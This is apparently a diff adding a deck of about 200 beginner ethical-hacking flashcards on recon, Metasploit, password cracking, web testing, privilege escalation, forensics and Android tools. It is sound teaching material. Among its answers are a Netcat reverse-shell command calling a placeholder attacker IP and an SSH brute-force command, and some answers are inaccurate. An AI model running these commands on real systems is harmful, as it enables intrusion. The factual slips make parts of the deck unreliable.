@@ -1,0 +1,609 @@
+// Ethical Hacking Fundamentals - Beginner Level
+
+What are the three core principles of information security known as the CIA triad?
+Confidentiality, Integrity, and Availability. These principles ensure that information is protected from unauthorized access, maintained in a correct state, and accessible when needed.
+
+What is the primary difference between ethical hacking and malicious hacking?
+Ethical hacking is authorized testing with permission from the system owner to identify vulnerabilities, while malicious hacking is unauthorized access for personal gain or malicious purposes.
+
+What is the first phase of any penetration testing engagement?
+Reconnaissance, which involves gathering information about the target system through passive and active methods to understand the attack surface.
+
+What is the difference between white-box, black-box, and gray-box testing?
+White-box testing provides full knowledge of the system, black-box testing provides no prior knowledge, and gray-box testing provides partial knowledge of the target system.
+
+What is the primary purpose of a vulnerability scan versus a penetration test?
+Vulnerability scanning identifies known vulnerabilities and misconfigurations, while penetration testing actively exploits vulnerabilities to determine the extent of potential damage.
+
+What is the most important legal consideration before conducting any security testing?
+Obtaining written authorization from the system owner, which clearly defines the scope, duration, and rules of engagement for the testing.
+
+What is the difference between a threat, a vulnerability, and a risk?
+A threat is a potential danger, a vulnerability is a weakness that can be exploited, and risk is the likelihood of a threat exploiting a vulnerability causing harm.
+
+What is the primary purpose of the Metasploit Framework?
+To provide a comprehensive platform for developing, testing, and executing exploit code against remote target machines in a controlled environment.
+
+What is the basic command to start the Metasploit Framework console?
+Type "msfconsole" in your terminal after installing Metasploit, which launches the interactive command-line interface for framework operations.
+
+What is the difference between a reverse shell and a bind shell?
+A reverse shell connects back to the attacker's machine, while a bind shell opens a listening port on the target machine that the attacker connects to.
+
+What is the primary function of Nmap in ethical hacking?
+Network discovery and security auditing through host discovery, port scanning, service detection, and operating system identification.
+
+What is the difference between TCP and UDP scanning?
+TCP scanning establishes full connections to determine if ports are open, while UDP scanning sends UDP packets and analyzes responses to identify open UDP services.
+
+What is the most basic Nmap command to scan for open ports on a target?
+"nmap [target_ip]" which performs a basic TCP scan of the top 1000 most common ports on the specified target.
+
+What is the primary purpose of the "ping" command in network reconnaissance?
+To test basic network connectivity and determine if a target host is reachable using ICMP echo requests.
+
+What is the difference between active and passive reconnaissance?
+Active reconnaissance involves direct interaction with the target, while passive reconnaissance gathers information without direct contact using publicly available sources.
+
+What is the primary function of the "whois" command in ethical hacking?
+To query domain registration information and identify ownership details, administrative contacts, and registration dates for target domains.
+
+What is the basic command to perform a DNS zone transfer attempt?
+"dig axfr [domain] @[dns_server]" which attempts to retrieve all DNS records for a domain from a specific DNS server.
+
+What is the primary purpose of port scanning in ethical hacking?
+To identify open ports and running services on target systems, which helps determine potential attack vectors and vulnerabilities.
+
+What is the difference between a SYN scan and a full TCP connect scan?
+A SYN scan sends only SYN packets (stealthier), while a full TCP connect scan completes the three-way handshake, making it more detectable but potentially more accurate.
+
+What is the primary function of the "netstat" command in system enumeration?
+To display active network connections, listening ports, and network statistics on both local and remote systems.
+
+What is the basic command to enumerate SMB shares on a target?
+"smbclient -L [target_ip]" which lists available SMB shares and provides basic information about shared resources.
+
+What is the primary purpose of banner grabbing in ethical hacking?
+To collect service banners and version information from running services, which helps identify potential vulnerabilities and exploits.
+
+What is the difference between vulnerability scanning and version scanning?
+Vulnerability scanning identifies known security weaknesses, while version scanning determines specific software versions to match against vulnerability databases.
+
+What is the basic command to perform an HTTP banner grab using Netcat?
+"nc -nv [target_ip] 80" then "GET / HTTP/1.0" and press Enter twice to retrieve the web server banner.
+
+What is the primary function of the "curl" command in web reconnaissance?
+To transfer data from or to a server using various protocols, useful for retrieving web pages, headers, and testing web applications.
+
+What is the difference between GET and POST HTTP methods?
+GET requests data from the server and appears in URLs, while POST submits data to the server and appears in the request body, making it more suitable for sensitive data.
+
+What is the basic command to test HTTP methods using curl?
+"curl -X OPTIONS [target_url]" which tests supported HTTP methods and can help identify potential security misconfigurations.
+
+What is the primary purpose of directory enumeration in web testing?
+To discover hidden directories and files that may contain sensitive information, administrative interfaces, or additional attack surfaces.
+
+What is the basic tool used for directory enumeration in ethical hacking?
+Tools like DirBuster, Gobuster, or Dirb, which systematically scan for directories and files using wordlists.
+
+What is the primary function of the "nikto" web vulnerability scanner?
+To scan web servers for known vulnerabilities, dangerous files, outdated server versions, and other security issues.
+
+What is the difference between authentication and authorization?
+Authentication verifies identity (who you are), while authorization determines permissions (what you're allowed to do).
+
+What is the basic command to perform a brute force attack on SSH using Hydra?
+"hydra -l [username] -P [password_list] ssh://[target_ip]" which attempts to guess SSH credentials using a password list.
+
+What is the primary purpose of password spraying in ethical hacking?
+To test a small number of common passwords against many accounts, which helps avoid account lockout detection compared to traditional brute force attacks.
+
+What is the difference between dictionary attacks and brute force attacks?
+Dictionary attacks use predefined wordlists, while brute force attacks try all possible character combinations, making brute force more comprehensive but slower.
+
+What is the basic command to create a simple reverse shell using Netcat?
+"nc -nv [attacker_ip] [port] -e /bin/bash" on the target, with "nc -lvp [port]" listening on the attacker machine.
+
+What is the primary function of the "wget" command in post-exploitation?
+To download files from the web, useful for retrieving additional tools, scripts, or exfiltrating data from compromised systems.
+
+What is the difference between a payload and an exploit in Metasploit?
+An exploit takes advantage of a vulnerability to gain access, while a payload is the code that executes after successful exploitation to perform specific actions.
+
+What is the basic command to search for modules in Metasploit?
+"search [keyword]" which searches through available exploits, payloads, auxiliary modules, and post-exploitation modules.
+
+What is the primary purpose of the "use" command in Metasploit?
+To select a specific module for configuration and execution, such as an exploit, auxiliary module, or post-exploitation tool.
+
+What is the basic command to show available options for a Metasploit module?
+"show options" which displays all configurable parameters for the currently selected module, including required and optional settings.
+
+What is the difference between required and optional options in Metasploit?
+Required options must be configured for the module to function properly, while optional options provide additional customization but aren't necessary for basic operation.
+
+What is the basic command to set an option in Metasploit?
+"set [option_name] [value]" which configures a specific parameter for the currently selected module.
+
+What is the primary function of the "check" command in Metasploit modules?
+To test if the target is vulnerable to the selected exploit without actually exploiting it, helping verify exploitability safely.
+
+What is the basic command to execute a Metasploit exploit?
+"exploit" or "run" which launches the currently selected exploit module against the configured target.
+
+What is the difference between a staged and a stageless payload?
+Staged payloads are delivered in multiple stages (smaller initial payload), while stageless payloads are delivered all at once (larger but more reliable).
+
+What is the primary purpose of the "sessions" command in Metasploit?
+To list, interact with, and manage established connections (shells) from successful exploits.
+
+What is the basic command to interact with an established session in Metasploit?
+"sessions -i [session_id]" which connects to and allows interaction with a specific compromised system session.
+
+What is the primary function of post-exploitation modules in Metasploit?
+To perform additional actions after gaining initial access, such as privilege escalation, persistence, or information gathering.
+
+What is the basic command to perform local privilege escalation in Linux?
+"sudo -l" to check sudo permissions, or "find / -perm -4000 -type f 2>/dev/null" to find SUID files for potential privilege escalation.
+
+What is the difference between SUID and SGID permissions in Linux?
+SUID allows a program to run with the owner's permissions, while SGID allows it to run with the group's permissions, both potentially useful for privilege escalation.
+
+What is the basic command to search for world-writable files in Linux?
+"find / -writable -type f 2>/dev/null" which identifies files that any user can modify, potentially useful for privilege escalation.
+
+What is the primary purpose of the "linpeas" script in Linux privilege escalation?
+To automate the enumeration of potential privilege escalation vectors, including misconfigurations, vulnerable software, and sensitive file permissions.
+
+What is the basic command to check running services in Linux?
+"ps aux" or "systemctl list-units --type=service --state=running" which displays active processes and services that might be exploitable.
+
+What is the difference between /etc/passwd and /etc/shadow files?
+/etc/passwd contains basic user account information readable by all users, while /etc/shadow contains encrypted passwords readable only by root.
+
+What is the basic command to crack Linux password hashes using John the Ripper?
+"john --wordlist=[wordlist] [password_file]" which attempts to crack password hashes using a dictionary attack.
+
+What is the primary purpose of the "hashcat" tool in password cracking?
+To perform high-speed password cracking using GPU acceleration, supporting various hash types and attack methods.
+
+What is the basic command to perform a dictionary attack with Hashcat?
+"hashcat -m [hash_type] -a 0 [hash_file] [wordlist]" which performs a dictionary attack against specified password hashes.
+
+What is the difference between online and offline password cracking?
+Online cracking attempts against live services with rate limiting, while offline cracking works on captured hash files without network constraints.
+
+What is the primary purpose of the "cewl" tool in password generation?
+To generate custom wordlists from target websites by extracting unique words, creating more targeted password lists for cracking attacks.
+
+What is the basic command to create a custom wordlist with Cewl?
+"cewl -d [depth] -m [min_length] -w [output_file] [target_url]" which extracts words from a website to create a password wordlist.
+
+What is the primary function of the "crunch" tool in password generation?
+To generate custom wordlists based on specified character sets and patterns, useful for creating comprehensive password lists.
+
+What is the basic command to generate a numeric password list with Crunch?
+"crunch [min_length] [max_length] 0123456789 -o [output_file]" which creates all possible numeric combinations within specified length ranges.
+
+What is the difference between rule-based attacks and mask attacks in Hashcat?
+Rule-based attacks apply transformation rules to dictionary words, while mask attacks use patterns to generate passwords with specific character positions.
+
+What is the primary purpose of the "maskprocessor" tool in Hashcat?
+To generate password candidates based on custom masks, allowing precise control over password patterns for targeted attacks.
+
+What is the basic command to perform a mask attack with Hashcat?
+"hashcat -m [hash_type] -a 3 [hash_file] [mask]" which performs a mask attack using a specified pattern for password generation.
+
+What is the primary function of the "sqlmap" tool in SQL injection testing?
+To automate the detection and exploitation of SQL injection vulnerabilities, including database fingerprinting and data extraction.
+
+What is the basic command to test a URL for SQL injection with sqlmap?
+"sqlmap -u [target_url] --dbs" which tests the specified URL for SQL injection and attempts to enumerate available databases.
+
+What is the difference between in-band and blind SQL injection?
+In-band injection returns results directly in the application response, while blind injection requires inference techniques to extract data.
+
+What is the primary purpose of the "burp suite" tool in web security testing?
+To intercept, analyze, and modify web traffic between your browser and web applications, enabling comprehensive security testing.
+
+What is the basic process to set up Burp Suite for web testing?
+Configure browser proxy to use Burp Suite (localhost:8080), enable intercept, and browse through the application to capture and analyze requests.
+
+What is the difference between the Repeater and Intruder modules in Burp Suite?
+Repeater allows manual modification and resending of individual requests, while Intruder automates attacks with multiple payloads and positions.
+
+What is the primary purpose of the "sequencer" module in Burp Suite?
+To analyze the randomness of tokens, session IDs, and other security-critical values to identify potential predictability vulnerabilities.
+
+What is the basic command to perform web application scanning with OWASP ZAP?
+"zap.sh -cmd -quickurl [target_url]" which launches ZAP and performs an automated scan of the specified web application.
+
+What is the difference between active and passive scanning in OWASP ZAP?
+Passive scanning analyzes traffic without sending additional requests, while active scanning sends specific attack payloads to identify vulnerabilities.
+
+What is the primary purpose of the "spider" functionality in web security tools?
+To automatically crawl and map web applications, discovering all pages, forms, and functionality available for testing.
+
+What is the basic command to perform subdomain enumeration with Sublist3r?
+"python sublist3r.py -d [domain] -o [output_file]" which enumerates subdomains for the specified domain using multiple search engines.
+
+What is the difference between DNS brute forcing and DNS scraping?
+DNS brute forcing tries possible subdomain names, while DNS scraping collects subdomains from public sources like search engines and certificates.
+
+What is the primary purpose of the "amass" tool in reconnaissance?
+To perform comprehensive external network mapping by enumerating subdomains, discovering hosts, and mapping attack surfaces.
+
+What is the basic command to perform subdomain enumeration with Amass?
+"amass enum -d [domain]" which enumerates subdomains and related infrastructure for the specified domain.
+
+What is the difference between passive and active reconnaissance in Amass?
+Passive mode uses only public information sources, while active mode performs direct DNS queries and port scanning for more comprehensive results.
+
+What is the primary purpose of the "shodan" search engine in ethical hacking?
+To find internet-connected devices, services, and vulnerabilities, enabling reconnaissance of exposed systems and potential attack surfaces.
+
+What is the basic search query to find web cameras using Shodan?
+"webcam" or "netcam" which searches for internet-connected web cameras and their associated information.
+
+What is the difference between Shodan and Censys for internet scanning?
+Shodan focuses on device and service discovery, while Censys provides more detailed certificate and protocol information with better search capabilities.
+
+What is the primary purpose of the "crt.sh" website in subdomain enumeration?
+To search certificate transparency logs for subdomains associated with a target domain, revealing additional attack surfaces.
+
+What is the basic process to use certificate transparency for subdomain discovery?
+Search the target domain on crt.sh, extract unique subdomains from the results, and add them to your target list for further testing.
+
+What is the primary function of the "waybackurls" tool in reconnaissance?
+To extract URLs from the Wayback Machine archives for a target domain, discovering forgotten pages, parameters, and potential vulnerabilities.
+
+What is the basic command to extract URLs from Wayback Machine with waybackurls?
+"echo [domain] | waybackurls" which retrieves and displays all archived URLs for the specified domain.
+
+What is the difference between the Wayback Machine and Google dorking for URL discovery?
+Wayback Machine provides historical archives, while Google dorking finds currently indexed pages using advanced search operators.
+
+What is the primary purpose of the "gau" tool in URL discovery?
+To Get All URLs from web archives for a target domain, providing comprehensive URL enumeration for security testing.
+
+What is the basic command to use GAU for URL enumeration?
+"gau [domain]" which retrieves all known URLs for the specified domain from multiple sources.
+
+What is the difference between JavaScript file analysis and parameter discovery in web testing?
+JavaScript analysis examines client-side code for endpoints and secrets, while parameter discovery identifies input points for testing vulnerabilities.
+
+What is the primary purpose of the "jsfinder" tool in JavaScript analysis?
+To extract endpoints, API keys, and sensitive information from JavaScript files, revealing additional attack surfaces and potential vulnerabilities.
+
+What is the basic command to analyze JavaScript files with JSFinder?
+"python JSFinder.py -u [target_url]" which analyzes JavaScript files on the target website for endpoints and sensitive information.
+
+What is the difference between manual and automated JavaScript analysis?
+Manual analysis allows deeper understanding of code logic, while automated analysis quickly extracts patterns and endpoints from multiple files.
+
+What is the primary purpose of the "linkfinder" tool in JavaScript endpoint discovery?
+To extract endpoints and URLs from JavaScript files using regular expressions, helping discover hidden functionality and API endpoints.
+
+What is the basic command to use LinkFinder for endpoint discovery?
+"python3 LinkFinder.py -i [javascript_file] -o cli" which analyzes a JavaScript file and displays discovered endpoints in the command line.
+
+What is the difference between client-side and server-side vulnerabilities?
+Client-side vulnerabilities affect the user's browser, while server-side vulnerabilities affect the server infrastructure and data processing.
+
+What is the primary purpose of the "xsser" tool in cross-site scripting testing?
+To automate the detection and exploitation of XSS vulnerabilities across multiple parameters and attack vectors.
+
+What is the basic command to test for XSS with XSSer?
+"xsser -u [target_url] --auto" which automatically tests the specified URL for various XSS vulnerabilities.
+
+What is the difference between reflected, stored, and DOM-based XSS?
+Reflected XSS is immediately reflected in responses, stored XSS is permanently stored on the server, and DOM-based XSS manipulates the DOM in the browser.
+
+What is the primary purpose of the "commix" tool in command injection testing?
+To automate the detection and exploitation of command injection vulnerabilities in web applications and operating systems.
+
+What is the basic command to test for command injection with Commix?
+"commix -u [target_url]" which automatically tests the specified URL for command injection vulnerabilities.
+
+What is the difference between OS command injection and code injection?
+OS command injection executes operating system commands, while code injection injects and executes programming code in the application context.
+
+What is the primary purpose of the "ssrfmap" tool in server-side request forgery testing?
+To automate the detection and exploitation of SSRF vulnerabilities by testing various payloads and analyzing responses.
+
+What is the basic command to test for SSRF with SSRFmap?
+"python3 ssrfmap.py -u [target_url] -p [parameter]" which tests the specified parameter for SSRF vulnerabilities using various payloads.
+
+What is the difference between blind and direct SSRF vulnerabilities?
+Direct SSRF returns the response from the requested resource, while blind SSRF doesn't return responses and requires inference techniques.
+
+What is the primary purpose of the "tplmap" tool in template injection testing?
+To automate the detection and exploitation of template injection vulnerabilities in various templating engines.
+
+What is the basic command to test for template injection with TPLmap?
+"python3 tplmap.py -u [target_url]" which automatically tests the specified URL for template injection vulnerabilities.
+
+What is the difference between server-side template injection and client-side template injection?
+Server-side SSTI executes on the server with system access, while client-side template injection executes in the browser with limited capabilities.
+
+What is the primary purpose of the "nosqli" tool in NoSQL injection testing?
+To automate the detection and exploitation of NoSQL injection vulnerabilities in MongoDB and other NoSQL databases.
+
+What is the basic command to test for NoSQL injection with nosqli?
+"python3 nosqli.py -u [target_url] -p [parameter]" which tests the specified parameter for NoSQL injection vulnerabilities.
+
+What is the difference between SQL injection and NoSQL injection?
+SQL injection targets relational databases using SQL syntax, while NoSQL injection targets NoSQL databases using their specific query syntax and operators.
+
+What is the primary purpose of the "xxer" tool in XML external entity testing?
+To automate the detection and exploitation of XXE vulnerabilities in XML processing systems.
+
+What is the basic command to test for XXE vulnerabilities with XXER?
+"python3 xxer.py -u [target_url]" which automatically tests the specified URL for XXE vulnerabilities using various payloads.
+
+What is the difference between blind XXE and direct XXE vulnerabilities?
+Direct XXE returns the results of external entity requests, while blind XXE requires out-of-band techniques to confirm exploitation.
+
+What is the primary purpose of the "jwt_tool" in JWT security testing?
+To analyze, manipulate, and crack JSON Web Tokens for security testing and vulnerability assessment.
+
+What is the basic command to analyze a JWT token with jwt_tool?
+"python3 jwt_tool.py [jwt_token]" which analyzes the JWT token structure, signature algorithm, and potential vulnerabilities.
+
+What is the difference between JWT signature attacks and algorithm confusion attacks?
+Signature attacks attempt to forge or crack signatures, while algorithm confusion attacks manipulate the algorithm field to bypass verification.
+
+What is the primary purpose of the "cme" (CrackMapExec) tool in network penetration testing?
+To automate network penetration testing by enumerating services, exploiting vulnerabilities, and executing commands across multiple hosts.
+
+What is the basic command to perform SMB enumeration with CrackMapExec?
+"crackmapexec smb [target_range] -u [username] -p [password]" which enumerates SMB services and attempts authentication across the target range.
+
+What is the difference between SMB and RPC enumeration in network testing?
+SMB enumeration focuses on file sharing and authentication, while RPC enumeration discovers remote procedure call services and their capabilities.
+
+What is the primary purpose of the "bloodhound" tool in Active Directory security?
+To analyze and visualize Active Directory relationships to identify attack paths and privilege escalation opportunities.
+
+What is the basic command to collect data with BloodHound?
+"bloodhound-python -c All -d [domain] -u [username] -p [password]" which collects comprehensive Active Directory data for analysis.
+
+What is the difference between local and domain privilege escalation in Windows?
+Local privilege escalation gains administrative rights on a single machine, while domain privilege escalation gains control over the entire Active Directory domain.
+
+What is the primary purpose of the "powerup" script in Windows privilege escalation?
+To identify common Windows privilege escalation vectors including misconfigurations, vulnerable services, and weak permissions.
+
+What is the basic command to run PowerUp in PowerShell?
+"Import-Module .\PowerUp.ps1; Invoke-AllChecks" which loads the PowerUp module and performs comprehensive privilege escalation checks.
+
+What is the difference between service misconfigurations and permission abuses in Windows?
+Service misconfigurations exploit vulnerable service settings, while permission abuses take advantage of excessive file or registry permissions.
+
+What is the primary purpose of the "sherlock" script in Linux privilege escalation?
+To identify common Linux privilege escalation vectors including kernel vulnerabilities, SUID binaries, and misconfigurations.
+
+What is the basic command to run Sherlock in Python?
+"python3 sherlock.py" which performs comprehensive Linux privilege escalation checks and displays potential exploitation vectors.
+
+What is the difference between kernel exploits and configuration abuses in Linux?
+Kernel exploits target vulnerabilities in the operating system kernel, while configuration abuses take advantage of system misconfigurations and weak permissions.
+
+What is the primary purpose of the "linuxprivchecker" script in Linux enumeration?
+To perform comprehensive Linux system enumeration for privilege escalation opportunities and security misconfigurations.
+
+What is the basic command to run Linux Privilege Checker?
+"python3 linuxprivchecker.py" which enumerates system information, running processes, network configuration, and potential privilege escalation vectors.
+
+What is the difference between automated enumeration tools and manual techniques?
+Automated tools quickly identify common vulnerabilities, while manual techniques allow deeper analysis and discovery of unique misconfigurations.
+
+What is the primary purpose of the "winpeas" script in Windows privilege escalation?
+To perform comprehensive Windows enumeration for privilege escalation opportunities, similar to LinPEAS for Linux systems.
+
+What is the basic command to run WinPEAS in Windows?
+".\winPEAS.exe" or ".\winPEAS.bat" which performs comprehensive Windows system enumeration and displays potential privilege escalation vectors.
+
+What is the difference between Windows and Linux privilege escalation methodologies?
+Windows focuses on services, permissions, and Active Directory, while Linux focuses on SUID files, kernel exploits, and configuration misconfigurations.
+
+What is the primary purpose of the "pspy" tool in Linux process monitoring?
+To monitor running processes without root privileges, identifying cron jobs, scheduled tasks, and background processes for potential exploitation.
+
+What is the basic command to run pspy for process monitoring?
+"./pspy32" or "./pspy64" depending on system architecture, which monitors and displays running processes and scheduled tasks.
+
+What is the difference between static and dynamic analysis in malware analysis?
+Static analysis examines malware without executing it, while dynamic analysis observes malware behavior in a controlled environment.
+
+What is the primary purpose of the "strings" command in basic malware analysis?
+To extract readable strings from binary files, helping identify potential functionality, URLs, and configuration information.
+
+What is the basic command to extract strings from a binary file?
+"strings [binary_file]" which displays all readable strings from the specified file, useful for initial malware analysis.
+
+What is the difference between file signature analysis and entropy analysis in malware detection?
+File signature analysis identifies known malware patterns, while entropy analysis measures randomness to detect packed or encrypted malware.
+
+What is the primary purpose of the "exiftool" in digital forensics?
+To extract and analyze metadata from files, including creation dates, author information, and hidden data that might be relevant to investigations.
+
+What is the basic command to analyze file metadata with ExifTool?
+"exiftool [file]" which displays comprehensive metadata information for the specified file.
+
+What is the difference between file system forensics and memory forensics?
+File system forensics analyzes stored data on disk, while memory forensics analyzes volatile data in RAM for active processes and network connections.
+
+What is the primary purpose of the "volatility" framework in memory forensics?
+To analyze memory dumps for running processes, network connections, and malware artifacts, providing insights into system state at the time of capture.
+
+What is the basic command to list processes in a memory dump with Volatility?
+"volatility -f [memory_dump] --profile=[profile] pslist" which displays running processes from the memory dump using the appropriate system profile.
+
+What is the difference between live forensics and dead forensics?
+Live forensics analyzes running systems without shutting them down, while dead forensics analyzes powered-off systems and disk images.
+
+What is the primary purpose of the "autopsy" tool in digital forensics?
+To provide a graphical interface for analyzing disk images and file systems, making forensic analysis more accessible and organized.
+
+What is the basic process to analyze a disk image with Autopsy?
+Create a new case, add the disk image as evidence, and use the various analysis modules to examine files, registry, and timeline data.
+
+What is the difference between timeline analysis and keyword searching in forensics?
+Timeline analysis reconstructs events chronologically, while keyword searching searches for specific terms or patterns across the evidence.
+
+What is the primary purpose of the "bulk_extractor" tool in forensic analysis?
+To extract specific features like URLs, email addresses, and domain names from disk images without analyzing the entire file system structure.
+
+What is the basic command to run bulk_extractor on a disk image?
+"bulk_extractor [image_file] -o [output_directory]" which extracts features from the disk image and saves them to the specified output directory.
+
+What is the difference between file carving and file system analysis in forensics?
+File carving recovers files based on content patterns without file system metadata, while file system analysis uses directory structures and metadata.
+
+What is the primary purpose of the "foremost" tool in file carving?
+To recover specific file types from disk images based on header and footer patterns, useful for recovering deleted or hidden files.
+
+What is the basic command to carve JPEG files with Foremost?
+"foremost -t jpeg -i [image_file] -o [output_directory]" which recovers JPEG files from the disk image and saves them to the output directory.
+
+What is the difference between logical and physical acquisitions in mobile forensics?
+Logical acquisition copies user-accessible data, while physical acquisition copies the entire device memory including deleted data and system areas.
+
+What is the primary purpose of the "adb" (Android Debug Bridge) in mobile forensics?
+To communicate with Android devices for data extraction, application analysis, and device control during forensic investigations.
+
+What is the basic command to list connected Android devices with ADB?
+"adb devices" which displays all connected Android devices in debugging mode, showing their serial numbers and connection status.
+
+What is the difference between Android and iOS forensic acquisition methods?
+Android allows more direct file system access, while iOS requires specialized tools and techniques due to stronger security controls and encryption.
+
+What is the primary purpose of the "ios-deploy" tool in iOS application analysis?
+To install and debug iOS applications on connected devices, useful for analyzing app behavior and extracting data during forensic investigations.
+
+What is the basic command to install an iOS app with ios-deploy?
+"ios-deploy --bundle [app_bundle_path]" which installs the specified iOS application on the connected device.
+
+What is the difference between application analysis and device analysis in mobile forensics?
+Application analysis focuses on individual app data and behavior, while device analysis examines the entire device including system files and partitions.
+
+What is the primary purpose of the "frida" tool in dynamic mobile analysis?
+To perform dynamic instrumentation and analysis of mobile applications, allowing runtime manipulation and security testing.
+
+What is the basic command to attach Frida to a running Android application?
+"frida -U -f [package_name] --no-pause" which attaches Frida to the specified Android application and starts the script interaction.
+
+What is the difference between static and dynamic mobile application analysis?
+Static analysis examines app code and resources without execution, while dynamic analysis observes app behavior during runtime execution.
+
+What is the primary purpose of the "objection" tool in mobile runtime exploration?
+To provide runtime mobile exploration capabilities, allowing security testing and analysis of iOS and Android applications without jailbreak/root.
+
+What is the basic command to explore an Android application with Objection?
+"objection -g [package_name] explore" which starts runtime exploration of the specified Android application.
+
+What is the difference between jailbroken and non-jailbroken iOS analysis?
+Jailbroken devices provide full file system access and debugging capabilities, while non-jailbroken analysis relies on runtime manipulation techniques.
+
+What is the primary purpose of the "mobSF" (Mobile Security Framework) tool?
+To provide comprehensive mobile application security analysis including static analysis, dynamic analysis, and API security testing.
+
+What is the basic process to analyze an Android app with MobSF?
+Upload the APK file to the MobSF web interface, wait for analysis completion, and review the comprehensive security report.
+
+What is the difference between automated and manual mobile security testing?
+Automated testing quickly identifies common vulnerabilities, while manual testing discovers complex logic flaws and business logic vulnerabilities.
+
+What is the primary purpose of the "drozer" tool in Android security testing?
+To perform dynamic security assessment of Android applications through runtime interaction and vulnerability exploitation.
+
+What is the basic command to start a Drozer session with an Android device?
+"drozer console connect" which starts the Drozer console and connects to the Android device for interactive security testing.
+
+What is the difference between AndroidManifest.xml analysis and runtime analysis in Android security?
+Manifest analysis examines app permissions and components statically, while runtime analysis observes actual behavior during execution.
+
+What is the primary purpose of the "apktool" tool in Android reverse engineering?
+To decompile APK files to smali code and resources, allowing analysis and modification of Android applications.
+
+What is the basic command to decompile an APK with APKTool?
+"apktool d [apk_file]" which decompiles the specified APK file into smali code and resources for analysis.
+
+What is the difference between smali code and Java source code in Android analysis?
+Smali is the low-level assembly representation of Android bytecode, while Java source code provides higher-level understanding but requires additional decompilation steps.
+
+What is the primary purpose of the "jadx" tool in Android application analysis?
+To decompile APK files to Java source code, providing more readable code for security analysis and vulnerability identification.
+
+What is the basic command to decompile an APK to Java with JADX?
+"jadx [apk_file]" or "jadx-gui [apk_file]" which decompiles the APK to Java source code in command line or graphical interface.
+
+What is the difference between static decompilation and dynamic analysis in Android security?
+Static decompilation examines code without execution, while dynamic analysis observes app behavior during runtime to identify runtime vulnerabilities.
+
+What is the primary purpose of the "aapt" (Android Asset Packaging Tool) in Android analysis?
+To extract and analyze Android application metadata, permissions, and components from APK files without full decompilation.
+
+What is the basic command to list permissions with AAPT?
+"aapt dump permissions [apk_file]" which displays all permissions requested by the specified Android application.
+
+What is the difference between permission analysis and component analysis in Android security?
+Permission analysis examines requested permissions and their security implications, while component analysis examines activities, services, and receivers for vulnerabilities.
+
+What is the primary purpose of the "keytool" in Android certificate analysis?
+To analyze and extract certificate information from Android applications, helping identify signing certificates and potential security issues.
+
+What is the basic command to extract certificate information with keytool?
+"keytool -printcert -jarfile [apk_file]" which displays certificate details including issuer, validity period, and fingerprint information.
+
+What is the difference between certificate analysis and code analysis in Android security?
+Certificate analysis examines signing and authenticity, while code analysis examines application logic and implementation vulnerabilities.
+
+What is the primary purpose of the "zipalign" tool in Android application optimization?
+To optimize APK files by aligning uncompressed data on 4-byte boundaries, improving performance and reducing memory usage.
+
+What is the basic command to optimize an APK with ZipAlign?
+"zipalign -v 4 [input_apk] [output_apk]" which aligns the input APK and saves the optimized version to the specified output file.
+
+What is the difference between APK optimization and APK signing in Android development?
+Optimization improves performance and alignment, while signing ensures authenticity and integrity of the application package.
+
+What is the primary purpose of the "apksigner" tool in Android application security?
+To sign APK files with digital certificates, ensuring authenticity and enabling installation on Android devices.
+
+What is the basic command to sign an APK with APKSigner?
+"apksigner sign --ks [keystore] --ks-key-alias [alias] [apk_file]" which signs the specified APK using the provided keystore and alias.
+
+What is the difference between debug signing and release signing in Android applications?
+Debug signing uses default certificates for testing, while release signing uses production certificates for distribution and requires proper security.
+
+What is the primary purpose of the "proguard" tool in Android code obfuscation?
+To obfuscate Java bytecode by renaming classes, fields, and methods, making reverse engineering more difficult while maintaining functionality.
+
+What is the basic command to obfuscate code with ProGuard?
+"proguard @proguard.config" which applies obfuscation rules specified in the configuration file to the compiled application.
+
+What is the difference between code obfuscation and code encryption in mobile security?
+Obfuscation makes code difficult to understand but still executable, while encryption requires decryption before execution and provides stronger protection.
+
+What is the primary purpose of the "ndk-build" tool in Android native development?
+To compile native C/C++ code into shared libraries for Android applications, enabling performance-critical operations and hardware access.
+
+What is the basic command to build native code with NDK-Build?
+"ndk-build" which compiles native source code in the current directory using Android.mk build files.
+
+What is the difference between Java/Kotlin development and native development in Android?
+Java/Kotlin development uses the Android framework and runs on the JVM, while native development uses C/C++ for performance-critical operations and direct hardware access.
+
+What is the primary purpose of the "gradle" build system in Android development?
+To automate the build process including compilation, packaging, and dependency management for Android applications.
+
+What is the basic command to build an Android app with Gradle?
+"./gradlew assembleDebug" or "./gradlew assembleRelease" which builds the application in debug or release configuration respectively.
+
+What is the difference between debug builds and release builds in Android applications?
+Debug builds include debugging information and can be easily analyzed, while release builds are optimized, obfuscated, and more secure for distribution.
+
+This comprehensive beginner-level collection provides the foundation for ethical hacking with 200+ questions covering all fundamental concepts, tools, and methodologies needed to start your journey in cybersecurity and penetration testing.
